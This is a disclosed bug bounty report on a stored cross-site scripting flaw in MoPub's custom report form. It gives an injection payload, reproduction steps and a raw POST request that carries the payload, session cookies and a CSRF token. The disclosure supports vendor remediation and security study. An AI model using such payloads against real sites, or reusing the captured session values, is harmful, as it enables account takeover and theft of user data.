# Stored XSS in https://app.mopub.com

## Report Details
- **Report ID**: 642281
- **URL**: https://hackerone.com/reports/642281
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-07-13T08:56:15.581Z
- **Disclosed**: 2019-12-17T23:52:36.359Z

## Reporter
- **Username**: august1808
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Vulnerable URL**
https://app.mopub.com/reports/custom/

**XSS Payload:** 
"><img src=x onerror=alert(domain)>

**Parameter** 
nrnew-interval

## Steps To Reproduce:
1. Login with your credentials.
2. Go to URL: https://app.mopub.com/reports/custom/
3. Click on New Network Report => Create a new network performance report.
4. Start Burp suite proxy and intercept on.
5. Click on Run and Save button. intercept the request.
6. Enter above payload in vulnerable parameter.
7. You will notice that xss will execute. 

## POST Request
```
POST /reports/custom/add_network_report/ HTTP/1.1
Host: app.mopub.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.mopub.com/reports/custom/
X-CSRFToken: Kamf4foDZKEQRxCOVLTalPmO0BKqNhdgexLNcHl3Vv1C4K2Dt6ckPmlIEhtYwHwe
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------68352596720712
Content-Length: 838
Connection: close
Cookie: _gcl_au=1.1.1079813240.1562926835; _ga=GA1.2.333952053.1562926836; _gid=GA1.2.668572806.1562926836; csrftoken=Kamf4foDZKEQRxCOVLTalPmO0BKqNhdgexLNcHl3Vv1C4K2Dt6ckPmlIEhtYwHwe; mp_mixpanel__c=1; mp__mixpanel=%7B%22distinct_id%22%3A%20%2216bea510e694ee-0d3dfa328c7f088-4c312f7f-e1000-16bea510e6a21%22%2C%22%24device_id%22%3A%20%2216bea510e694ee-0d3dfa328c7f088-4c312f7f-e1000-16bea510e6a21%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.mopub.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.mopub.com%22%7D; sessionid=foc4dxhc0fpft4k0v55llxgdrdxz18ap; mp_c99579c4804fba6b8aeed7a911581652_mixpanel=%7B%22distinct_id%22%3A%20%22285f16e8e3a64ffc9bcc629faccb3d23%22%2C%22%24device_id%22%3A%20%2216bea511f491de-05975356a250958-4c312f7f-e1000-16bea511f4a4b3%22%2C%22accountKey%22%3A%20%229ea06dcced234a41a7bf431dd78ac134%22%2C%22accessLevel%22%3A%20%22member%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%3Fnext%3D%2Fdashboard%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22285f16e8e3a64ffc9bcc629faccb3d23%22%7D

-----------------------------68352596720712
Content-Disposition: form-data; name="nrnew-saved"

on
-----------------------------68352596720712
Content-Disposition: form-data; name="nrnew-name"

todayxss1111222
-----------------------------68352596720712
Content-Disposition: form-data; name="nrnew-recipients"

admin123@mailinator.com
-----------------------------68352596720712
Content-Disposition: form-data; name="nrnew-interval"

custom"><img src=x onerror=alert(cookie)>
-----------------------------68352596720712
Content-Disposition: form-data; name="nrnew-start"

07/17/2019
-----------------------------68352596720712
Content-Disposition: form-data; name="nrnew-end"

07/19/2019
-----------------------------68352596720712
Content-Disposition: form-data; name="nrnew-sched_interval"

none
-----------------------------68352596720712--
```
{F528288}

{F528287}

## Impact

with the help of this attack, an attacker can execute malicious javascript on an application

## Attachments
- Annotation_2019-07-13_140632.png
- Annotation_2019-07-13_141218.png
- XSSS.webm
